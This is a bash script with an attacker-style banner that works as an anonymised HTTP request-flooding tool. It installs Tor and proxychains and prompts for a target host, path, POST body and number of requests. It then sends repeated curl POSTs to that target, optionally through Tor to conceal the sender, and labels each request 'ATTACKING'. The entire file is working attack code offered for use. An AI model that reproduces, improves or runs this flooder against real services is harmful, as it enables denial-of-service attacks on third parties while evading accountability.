#!/bin/bash
# MADE BY WickedW0LF
# v1.1

# COLORS

white="\033[1;37m"
light_grey="\033[0;37m"
light_red="\033[1;31m"
red="\033[0;31m"
on_green="\033[0;30m \033[42m"
light_green="\033[1;32m"
green="\033[0;32m"
light_blue="\033[1;34m"
blue="\033[0;34m"
error="\033[5;37m\033[7;31m"
nc="\e[0m"



# BANNER

clear
echo -e "$green" && cat << "BANNER"
               ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO
      ,;::::::;     ;'         / OOOOOOO
    ;:::::::::`. ,,,;.        /  / DOOOOOO
  .';:::::::::::::::::;,     /  /     DOOOO
 ,::::::;::::::;;;;::::;,   /  /        DOOO
;`::::::`'::::::;;;::::: ,#/  /          DOOO
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O
  `:::::`::::::::;' /  / `:#
   ::::::`:::::;'  /  /   `#
				THE TIME HAS COME...

BANNER
echo -e "		"$light_grey"Author$light_red :$on_green W1ckedW0LF $nc\n"



# SOME COMPATIBILITES

wget -q --spider https://google.com

if [ ! $? -eq 0 ]; then
  echo -e " $error You are offline! $nc\n"
  exit 1
fi

if [[ ! -n `command -v tor` && ! `dpkg -s proxychains4 >/dev/null 2>&1` ]]; then
  printf "$light_red Installing required packages: "
  sudo apt-get install tor proxychains4 -y > /dev/null

   if [[ `dpkg -s tor | grep -o installed | head -1` = "installed" && `dpkg -s proxychains4 | grep -o installed` = "installed" ]]; then
     printf "$light_green Completed!"
     echo -e "\n\n"
   else
     printf "$error Error! "$nc"\n\n"
     exit 0
  fi
fi




# SOME INPUTS

read -e -p "$(echo -e "$white" Enter the hostname"$light_red" : $light_green)" host
read -e -p "$(echo -e "$white" Enter the URI File"$light_red" : $light_green)" file
read -e -p "$(echo -e "$white" Enter the body content"$light_red" : $light_green)" body
read -e -p "$(echo -e "$white" [ENTER] for default / UserAgent"$light_red" : $light_green)" agent
read -e -p "$(echo -e "$white" Number of requests to send"$light_red" : $light_green)" snum
read -e -p "$(echo -e "$white" Do you want to hide your IP? [Y/n]"$light_red" : $light_green)" hide

#read -n 1 -s -r -p "$(echo -e "\n\n$light_blue") Press any key to Start... "
printf "\n$light_blue Press any key to Start... "

# ACTION

# CONVERTING HOSTNAME TO IP

ip=`host $host | head -1 | awk '{print $4}'`


# JUST A THING FOR LINES COUNTING

while read; do
count=0

# IP HIDE OPTION YES

if [[ $hide == "y" || $hide == "Y" || $hide == "yes" || $hide == "Yes" || $hide == "YES" ]]; then


        echo -e "\n$light_green$(echo "		Starting at$light_red :$white "`date "+%G-%d.%m AT %H:%M"`)\n"

service tor start > /dev/null



	if [ ! -n "$agent" ]; then

		for i in `seq $snum`; do
	    	   proxychains4 -q curl -s --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36' -d $body $host/$file
	 	    tor_noagent=`echo -e " "$white"["$red"ATTACKING_TOR-MODE"$white"]$green TARGET$light_red :$light_grey $host "$white"($blue$ip$white)$green"`
			((count=$count+1))
		   echo $tor_noagent $count $(printf " of $snum")
		done

                echo -e "\n$light_green		Completed at$light_red :$white $(date "+%G-%d.%m AT %H:%M"$nc)\n"
                exit 0


	elif [ -n "$agent" ]; then

		for i in `seq $snum`; do
	   	   proxychains4 -q curl -s --user-agent "$agent" -d $body $host/$file
	 	    tor_agent=`echo -e " "$white"["$red"ATTACKING_TOR-MODE"$white"]$green TARGET$light_red :$light_grey $host "$white"($blue$ip$white)$green"`
			((count=$count+1))
		   echo $tor_agent $count $(printf " of $snum")
		done

                echo -e "\n$light_green		Completed at$light_red :$white $(date "+%G-%d.%m AT %H:%M"$nc)\n"
                exit 0

	fi

service tor stop



# IP HIDE OPTION NO

elif [[ $hide == "n" || $hide == "N" || $hide == "no" || $hide == "No" || $hide == "NO" ]]; then


	echo -e "\n$light_green$(echo "		Starting at$light_red :$white "`date "+%G-%d.%m AT %H:%M"`)\n"


	if [ ! -n "$agent" ]; then

		for i in `seq $snum`; do
		   curl -s --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36' -d $body $host/$file
		     agent_no=`echo -e " "$white"["$red"ATTACKING"$white"]$green TARGET$light_red :$light_grey $host "$white"($blue$ip$white)$green"`
			((count=$count+1))
		   echo $agent_no $count $(printf " of $snum")
  		   sleep 0.10
	 	done

                echo -e "\n$light_green		Completed at$light_red :$white $(date "+%G-%d.%m AT %H:%M"$nc)\n"
		exit 0

	elif [ -n "$agent" ]; then

		for i in `seq $snum`; do
		   curl -s --user-agent "$agent" -d $body $host/$file
		     agent_yes=`echo -e " "$white"["$red"ATTACKING"$white"]$green TARGET$light_red :$light_grey $host "$white"($blue$ip$white)$green"`
			((count=$count+1))
		   echo $agent_yes $count $(printf " of $snum")
		   sleep 0.10
		done

                echo -e "\n$light_green		Completed at$light_red :$white $(date "+%G-%d.%m AT %H:%M"$nc)\n"
                exit 0


	fi


# WRONG INPUT

else
  printf "$error Error! "$nc"\n\n"
exit 1
fi
done
